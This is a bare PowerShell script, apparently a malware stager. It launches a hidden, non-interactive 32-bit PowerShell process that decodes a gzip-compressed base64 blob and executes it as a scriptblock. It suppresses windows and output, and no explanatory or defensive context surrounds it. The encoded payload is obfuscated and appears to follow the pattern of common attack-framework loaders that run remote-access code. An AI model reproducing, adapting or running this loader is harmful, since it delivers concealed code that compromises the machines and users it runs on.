if([IntPtr]::Size -eq 4){
    $b='powershell.exe'
}else{
    $b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'
};
$s=New-Object System.Diagnostics.ProcessStartInfo;
$s.FileName=$b;
$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAD4/yFwCA7VW+2+bSBD+OZHyP6DKEqA4xsRO00aqdIufOCaxg+34UavawAIbL2DD4lev//sNNrTpNb1rTzqUx7I7MzvzzTczOElgcRoGgqe1korw+ez0pIcj7AtSIdFZUSi4vnxyAruF+PJq/1b4IEgztFzWQx/TYH5zU0uiiAT8+F5qEY7imPhPjJJYkoU/hUePROTi/umZWFz4LBQ+lVosfMIsE9vVsOUR4QIFdnrWDS2celMyl4xySfz4UZRnF+q81FglmMWSaO5iTvySzZgoC1/k9MLBbkkk0aBWFMahw0uPNKhcloZBjB1yB9bWxCDcC+1YlCEM+IkIT6JAOAaUWjieSyIse1FoIduOSByLRWGW2p7N539Is+zihyTg1CclPeAkCpcmidbUInGpjQObkQfizEHL5BEN3Lksg9g6XBCpECQMsPwdM9Id2eSw/aqS9FIJpHo8kouQyNcCNUI7YeSoKr7iaZp9GZ4jAwC5L2enZ6dOzhZa/lR7SRZYncwOawLOSb0wpge5D0K5KBhwC+ZhtIPXwiBKiDz/Cq1Q2Meb4s/V1VwWJN11DXZmo5Dac9DI0lmg0366/XNW1olDA1LfBdinVk486TWEicPIIcBSLnYHLklidkDsOmHExTyFLE30D2oNn/KvulpCmU0iZEGWYvAKEih/78wxC5KoBwbxAaDjOzCv4ADdSS6dUXyX356+g5BYYziOi0IvgXqzioJJMCN2UUBBTLMjlPDwsBS/uWskjFMLxzw3N5czGLPramEQ8yixIGUQ+sBcEotiliJRFNrUJtrOpG5+rfgqDjXMGNQAWFpDHmAnjd/kKREi8DBNulwyCdf9JSM+iBzKvsmwC0WeEf1AHOwSW/ybfzmNj5xNgcgReOEdZNdkIS8KIxpxaB4pqECg/3T3i6aRelGLSJYEKS+MmbbjKZ0LweV1I2VjBskBgIhD8M0o9DUck7fVY3uQ3ij3tIbgmegBMyxtQVW0oapuwO+QVvSwfm3fdp7bSlTfeg7SY91o9+r9dru67pijKjcbOr/t6dxojJ+fTdR+GE74VEftAS0vJtX9skP3ZhfZk63ydq/tN2Vtu392bWdSdxz32jEf1Ksm7T7W+lr5EnfrjaT7qG20cjVu0E27T4f9RafJnyYjhoeO4o7V95huu9HzSA2NvY5Qy6tY+44zanmGvZu0KXlWyl3aR32Ebq2H4bDlLt1WjJT3o1XNd28R0g2MdNQY7TpXTOsPmxoaNrQ+vg97lfO6ok7tVaM5HeOOz+xWW1EnY2SjSBm4nnp97wUpTtjVVloqg7rTXVMBmV4VtauXdD9d9VsuaoDMyA8RbtLF8HwMNu8GoPM4VO0Q8UAfK8rIVVzkmN4EIw2ktRVqamFt965n9JTR6NJTnxaqBz6T8fqd0UHnTaunKMq5/wR/FWQZy20w1jbXa7dthrf4Fo/W04qiDjYtB63Q+bmmak+83ah01nDvQHk//PAmpQ/wp4B71cULXvyslxs4ij3MgC/Qo/P6bIZRM2u8vZCmGpJ0HNcLEgWEwbiDgZgTHTEWWmnfP/RomDnHSZAOpiEsK5evrmThq6D8bRzkWzc3U3ATaield6lLApd7xfK2Ui5Dey9vq2UI89dDq4XLnXQwVUzHwwGb3DY72JbTmipsVON/hiyrZA/+2f8G2be9fzj9JRjLxWPIP2x/v/FbmP5+7I+YchA1oRcxcpyDr0OQEeTFRwIkBrLvZE/6mXef8Is7+HQ4O/0LsvVUpFEKAAA=''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
$s.UseShellExecute=$false;
$s.RedirectStandardOutput=$true;
$s.WindowStyle='Hidden';
$s.CreateNoWindow=$true;
$p=[System.Diagnostics.Process]::Start($s);
